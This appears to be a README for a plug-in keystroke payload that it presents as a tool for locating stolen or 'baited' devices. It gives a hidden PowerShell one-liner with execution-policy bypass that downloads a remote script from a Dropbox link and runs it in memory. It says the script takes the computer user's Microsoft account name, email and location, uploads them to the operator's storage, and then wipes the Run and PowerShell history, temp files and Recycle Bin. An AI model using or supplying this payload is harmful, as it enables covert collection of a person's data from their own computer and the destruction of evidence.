
# ET Phone Home

A script I put together to locate your stolen devices, or your "stolen" baited devices

## Description

This program is meant to locate your devices. When someone plugs it into their computer a one liner in the run box a script 
will be downloaded and executed that grabs the Name and email of the associated microsoft account and the 
latitude and longitude of where the device was activated. This information is stored in a text document that is then uploaded to your dropbox. 
Finally the end of the script will delete the runbox and powershell history and delete the files in the TMP Folder and Recycle Bin. 

## Getting Started

### Dependencies

* DropBox - Your Shared link for the intended file
* Windows 7,10,11


### Executing program

* Your device is plugged into the targets computer
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory 
```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```
Something Like What you see below will be in your cloud storage:

NAME

EMAIL 

LATITUDE AND LONGITUDE

```
examplename

example@example.com

 Latitude  Longitude
 --------  ---------
37.778919 -122.416313
```


